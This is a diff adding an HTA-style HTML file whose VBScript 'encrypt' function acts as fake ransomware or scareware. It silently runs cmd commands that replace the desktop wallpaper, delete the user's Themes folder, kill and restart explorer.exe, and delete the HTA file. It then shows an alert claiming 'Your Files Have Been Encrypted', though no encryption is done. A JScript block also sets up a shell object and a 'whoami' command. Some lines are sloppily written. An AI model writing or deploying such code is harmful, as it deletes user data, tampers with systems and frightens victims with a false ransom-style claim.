@@ -1,0 +1,43 @@
+<html> 
+<head> 
+<script language="JScript">
+    var Shell = new ActiveXObject("WScript.Shell");
+    var cmd = "%COMSPEC% /c whOaMi"
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+<script language="VBScript">
+    function encrypt
+    set ws=CreateObject("Wscript.Shell")
+    set env=ws.Environment("Process")
+    set fso = CreateObject("Scripting.FileSystemObject")
+    ws.run "cmd /C for /f %f in ('dir /b /a-d') do echo %f"
+     If  fso.folderExists("C:\Windows\Temp\dirty")Then
+    else
+        fso.Createfolder("C:\Windows\Temp\dirty")
+    end if
+     If fso.fileExists("C:\Windows\Temp\dirty\t.jpg") Then
+        ' 如果已加密，清理临时文件并显示提示
+        ws.run "cmd /c rd /s /q 0.hta",0
+        alert("Your Files Have Been Encrypted")
+    else
+        set f = fso.CreateTextFile("C:\Windows\Temp\dirty\titties.txt", true) 
+        f.Write(ws.regread("HKCU\Control Panel\Desktop\wallpaper"))
+        f.Close()
+        fread=ws.regread("HKCU\Control Panel\Desktop\wallpaper")
+        ws.run "cmd /c copy "&Chr(34)&fread&Chr(34)&" C:\Windows\Temp\dirty\t.jpg /Y &&copy dirty\wallpaper.bmp "&Chr(34)&fread&Chr(34)&" /Y &&rd /s /q dirty",0"
+         if instr(fread,"\AppData\Roaming\Microsoft\Windows\Themes")>0 Then
+        else
+            ws.run "cmd /c echo Y | rmdir /s "&env.Item("HOMEDRIVE")&env.Item("HOMEPATH")&"\AppData\Roaming\Microsoft\Windows\Themes",0
+        end if
+        ws.run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+        ws.run "cmd /c ping -n 1 127.0.0.1>nul &&taskkill /IM explorer.exe /F&&start c:\Windows\Explorer.exe",0
+    end if
+    ws.run "cmd /c rd /s /q dirty",0
+end function
+</script>
